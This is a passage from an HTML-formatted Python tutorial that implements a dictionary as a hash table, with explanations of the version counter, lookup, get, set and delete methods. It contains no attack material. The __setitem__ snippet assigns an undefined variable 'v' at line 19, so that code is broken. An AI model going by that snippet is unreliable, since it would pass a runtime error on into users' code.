&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Dictionary&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;        __version &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_increase_version&lt;/span&gt;(self):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__version &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Dictionary&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__version
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6&lt;/span&gt;            Dictionary&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__version &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;7&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;8&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;9&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_increase_version()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The &lt;code&gt;__version&lt;/code&gt; variable keeps a counter of the number of dictionary instances, so each instance can have a unique version.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;_increase_version&lt;/code&gt; is planned to be called by operations such as &lt;code&gt;__setitem__&lt;/code&gt; and &lt;code&gt;__delitem__&lt;/code&gt;. It sets the current instance&amp;rsquo;s version to the latest of the class variable, and increases the class variable by one.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 9&lt;/strong&gt; initializes the dictionary with the latest version.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;putting-it-all-together&#34;&gt;Putting It All Together&lt;/h3&gt;
&lt;div class=&#34;toast toast--blue add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Note&lt;/p&gt;
		&lt;p class=&#34;toast__message&#34;&gt;
			The full code can be found &lt;a href=&#34;https://github.com/AdamGold/materials/blob/patch-1/python-hash-tables/dict_implementation.py&#34;&gt;here&lt;/a&gt;.
		&lt;/p&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;It&amp;rsquo;s time to use all these cool new methods and make your dictionary usable!&lt;/p&gt;
&lt;h4 id=&#34;_lookup&#34;&gt;&lt;code&gt;_lookup&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_lookup&lt;/span&gt;(self, key: Any, hashvalue: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Tuple[int, Any]:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;        mask &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;        freeslot &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; None
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_generate_probes(hashvalue, mask):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;            entry_index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices[index]
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; entry_index &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; FREE:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (index, FREE) &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; freeslot &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; None &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; (freeslot, DUMMY)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; entry_index &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; DUMMY:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; freeslot &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; None:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;                    freeslot &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;                dict_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys[entry_index]
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; dict_key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; (
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;                    dict_key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hashvalue &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; hashvalue &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; dict_key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; key
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15&lt;/span&gt;                ):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16&lt;/span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (index, entry_index)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s quite similar to the &lt;code&gt;lookup&lt;/code&gt; method from earlier, only this time it uses &lt;code&gt;self.indices&lt;/code&gt; as the hash table, &lt;code&gt;FREE&lt;/code&gt; to check for empty slots instead of &lt;code&gt;None&lt;/code&gt;, and &lt;code&gt;self.keys&lt;/code&gt; to check for equality and identity of keys.&lt;/p&gt;
&lt;h4 id=&#34;__getitem__&#34;&gt;&lt;code&gt;__getitem__&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __getitem__(self, key: Any) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Any:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;        hashvalue &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hash(key)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&lt;/span&gt;        _, entry_index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_lookup(key, hashvalue)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; entry_index &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:  &lt;span style=&#34;color:#75715e&#34;&gt;# FREE or DUMMY&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyError&lt;/span&gt;(key)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values[entry_index]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Same here! Very similar to the &lt;code&gt;search&lt;/code&gt; method you&amp;rsquo;ve already seen, &lt;code&gt;__getitem__&lt;/code&gt; now uses a simple &lt;code&gt;&amp;lt; 0&lt;/code&gt; check to check if the slot is empty or dummy. If so, it returns a &lt;code&gt;KeyError&lt;/code&gt;. If not, it returns the value from the &lt;code&gt;values&lt;/code&gt; table.&lt;/p&gt;
&lt;h4 id=&#34;__setitem__&#34;&gt;&lt;code&gt;__setitem__&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __setitem__(self, key: Any, value: Any):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_check_keys_sharing()
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;        hashvalue &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hash(key)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;        indices_index, entry_index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_lookup(key, hashvalue)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; entry_index &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:  &lt;span style=&#34;color:#75715e&#34;&gt;# FREE or DUMMY&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_increase_version()
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices[indices_index] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;used
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;            dict_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; DictKey(key&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;key, hashvalue&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;hashvalue)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(dict_key)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(value)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;used &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; entry_index &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; FREE:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;                self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filled &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# DUMMY? `filled` would have already contained it&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filled &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; len(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15&lt;/span&gt;                    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_resize(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; len(self))
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; value &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values[entry_index]:  &lt;span style=&#34;color:#75715e&#34;&gt;# only if its a different value&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18&lt;/span&gt;                self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_increase_version()
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19&lt;/span&gt;                self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values[entry_index] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 2&lt;/strong&gt; converts the dictionary to a non shared dictionary.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 6&lt;/strong&gt; increases the version if the slot is unoccupied.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 7&lt;/strong&gt; fills the hashed index in &lt;code&gt;self.indices&lt;/code&gt; with the index of the key and value which is essentially &lt;code&gt;self.used&lt;/code&gt; because it&amp;rsquo;s the last index of &lt;code&gt;keys&lt;/code&gt; and &lt;code&gt;values&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 13&lt;/strong&gt; increases &lt;code&gt;self.filled&lt;/code&gt; If that slot was free. That&amp;rsquo;s done because if it weren&amp;rsquo;t free, than &lt;code&gt;self.filled&lt;/code&gt; would have already included it.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 14&lt;/strong&gt; resizes the table by 3 if it&amp;rsquo;s more than 2/3 filled. It follows the logic of &lt;a href=&#34;https://github.com/python/cpython/blob/master/Objects/dictobject.c#L429&#34;&gt;C Python resize&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Line 17&lt;/strong&gt; checks if the new value differs from the value that is about to be replaced. The dictionary does not increase the version if nothing changes.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;__delitem__&#34;&gt;&lt;code&gt;__delitem__&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __delitem__(self, key: Any):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_check_keys_sharing()
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;        hashvalue &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hash(key)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;        indices_index, entry_index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_lookup(key, hashvalue)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; entry_index &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyError&lt;/span&gt;(key)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_increase_version()
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;used &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices[indices_index] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; DUMMY
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# swap with the last item to avoid holes&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; entry_index &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;used:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;            last_key_dict &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14&lt;/span&gt;            last_value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15&lt;/span&gt;            last_entry_indices_index, _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;_lookup(
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16&lt;/span&gt;                last_key_dict&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;key, last_key_dict&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hashvalue
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17&lt;/span&gt;            )
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;indices[last_entry_indices_index] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; entry_index
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys[entry_index] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; last_key_dict
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20&lt;/span&gt;            self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values[entry_index] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; last_value
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21&lt;/span&gt;        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;keys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pop()
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22&lt;/span&gt;        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;values&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pop()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 2&lt;/strong&gt; converts the dictionary to a non shared dictionary.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 6&lt;/strong&gt; raises &lt;code&gt;KeyError&lt;/code&gt; If the slot is unoccupied.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 10&lt;/strong&gt; inserts a &lt;code&gt;DUMMY&lt;/code&gt; value instead of the actual value.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 12&lt;/strong&gt;: You might have thought that a &lt;code&gt;del&lt;/code&gt; operation might suffice, but it would have left a hole inside the &lt;code&gt;keys&lt;/code&gt; and &lt;code&gt;values&lt;/code&gt; table. These tables must not contain any holes. The solution is to swap with the last item and then delete the last item.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 18&lt;/strong&gt; changes the swapped element&amp;rsquo;s indices value to the current spot that&amp;rsquo;s being swapped.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;__contains__&#34;&gt;&lt;code&gt;__contains__&lt;/code&gt;&lt;/h4&gt;
